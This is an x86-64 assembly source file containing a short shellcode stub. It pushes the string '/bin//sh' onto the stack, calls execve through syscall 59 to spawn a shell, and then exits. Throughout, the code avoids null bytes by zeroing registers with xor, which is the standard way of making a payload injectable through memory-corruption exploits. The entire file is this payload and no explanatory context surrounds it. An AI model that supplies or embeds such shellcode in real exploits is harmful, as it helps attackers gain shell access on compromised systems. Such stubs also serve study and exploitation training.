section .text
global _start
	_start:
		; exec
		xor rdx,rdx
		xor rsi,rsi
		push rdx
		; push '/bin//sh'
		; 0x2f 0x62 0x69 0x6e 0x2f 0x2f 0x73 0x68
		mov rdi, 68732f2f6e69622fH
		push rdi
		mov rdi, rsp
		xor rax,rax
		mov al, 59
		syscall
		; exit
		; xor rdi, rdi
		mov al, 60
		syscall
